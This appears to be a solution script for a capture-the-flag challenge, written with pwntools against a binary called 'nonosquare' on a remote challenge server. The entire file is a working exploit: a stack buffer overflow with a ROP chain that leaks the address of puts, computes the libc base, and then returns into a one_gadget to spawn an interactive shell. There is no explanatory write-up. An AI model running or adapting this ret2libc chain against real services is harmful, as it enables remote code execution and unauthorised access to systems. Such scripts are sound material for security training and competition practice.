from pwn import *

r = remote("challenges.uactf.com.au" ,30003)
#r = process("./nonosquare")
e = ELF("./nonosquare")
libc = ELF("./libc-2.31.so")
pop_rdi = 0x0000000000401343                # pop rdi; ret
pop_rsi = 0x0000000000401341                # pop rsi; pop r15; ret
exploit = b"A" * 56 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(e.sym.main) 
r.sendlineafter('is it?\n' ,exploit)
r.recvuntil(b'no no no\nDid you have fun?\n')
libc_leak = u64(r.recvuntil(b"\x7f") + b"\x00" * 2)
libc_base = libc_leak - libc.sym.puts
one_gadget = libc_base + 0xe3b04
log.info(f"[LEAK] libc puts: {hex(libc_leak)}")
log.info(f"[LEAK] libc base: {hex(libc_base)}")
log.info(f"[LEAK] one gadget: {hex(one_gadget)}")
exploit = b"A" * 56 + p64(pop_rsi) + p64(0x0) * 2 + p64(one_gadget)
r.sendlineafter('is it?\n' ,exploit)
r.interactive()
